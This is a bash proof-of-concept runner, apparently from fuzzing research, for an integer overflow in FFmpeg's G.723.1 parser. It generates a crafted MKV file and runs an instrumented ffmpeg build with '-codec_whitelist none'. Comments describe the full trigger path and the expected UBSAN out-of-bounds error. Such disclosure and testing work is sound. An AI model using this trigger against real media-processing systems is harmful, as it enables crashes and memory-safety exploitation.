#!/bin/bash
# PoC runner for VULN 001: Integer Overflow in g723_1 Parser
# CWE-190 -> CWE-125 (Signed Integer Overflow -> OOB Read)
#
# Trigger path:
#   MKV A_MS/ACM + WAVEFORMATEX(nChannels=0) + EBML Channels=178956971
#   -> MKV demuxer: need_parsing=AVSTREAM_PARSE_HEADERS, nb_channels=178956971
#   -> avcodec_open2 with -codec_whitelist 'none' fails BEFORE avctx->internal
#      is allocated, so av_opt_free is NOT called and ch_layout is NOT reset
#   -> parse_packet -> g723_1_parse: 24*178956971 signed int overflow (UBSAN)
#
# Expected: UBSAN runtime error:
#   src/libavcodec/g723_1_parser.c:41:14: runtime error:
#   signed integer overflow: 24 * 178956971 cannot be represented in type 'int'

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
INPUT="$SCRIPT_DIR/vuln_001_input.mkv"

echo "[*] Generating crafted MKV/G.723.1 input file..."
python3 "$SCRIPT_DIR/vuln_001_gen.py"
echo ""

echo "[*] Running ffmpeg with crafted MKV file..."
echo "[*] Using -codec_whitelist 'none' to prevent avcodec_open2 from resetting avctx"
echo "[*] Command: $BIN -codec_whitelist 'none' -i $INPUT -f null -"
echo ""

# -codec_whitelist 'none' causes avcodec_open2 to fail the whitelist check
# BEFORE allocating avctx->internal, so av_opt_free is NOT called, and
# avctx->ch_layout.nb_channels (=178956971) is preserved for the parser.
ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan.log" \
    "$BIN" -codec_whitelist 'none' -i "$INPUT" -f null - 2>&1 || true

# Print any ASAN log files
echo ""
for logfile in "${SCRIPT_DIR}"/asan.log.*; do
    if [ -f "$logfile" ]; then
        echo "[*] ASAN log: $logfile"
        cat "$logfile"
    fi
done

echo ""
echo "[*] Done."
